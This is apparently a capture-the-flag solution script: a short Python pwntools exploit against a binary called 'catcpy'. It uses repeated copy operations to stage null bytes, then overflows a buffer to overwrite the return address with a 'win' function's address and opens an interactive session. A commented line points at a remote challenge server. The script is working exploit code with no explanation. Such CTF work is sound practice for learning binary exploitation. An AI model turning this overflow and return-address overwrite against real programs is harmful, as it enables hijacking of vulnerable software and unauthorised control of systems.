from pwn import *

elf = ELF('./catcpy')
#io = process(['gdbserver', 'localhost:1234', './catcpy'])
io = process(elf.path)
#io = remote('34.170.146.252', 13997)

for i in range(4):
    payload = b'a' * 255
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Data: ', payload)
    payload = b'a' * (25 + 5 - i) + b'\x00'
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Data: ', payload)

payload = b'a' * 255
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'Data: ', payload)
payload = b'a' * 25
payload += p64(elf.sym['win'])
io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'Data: ', payload)

# finish main
io.sendlineafter(b'> ', b'3')

io.interactive()
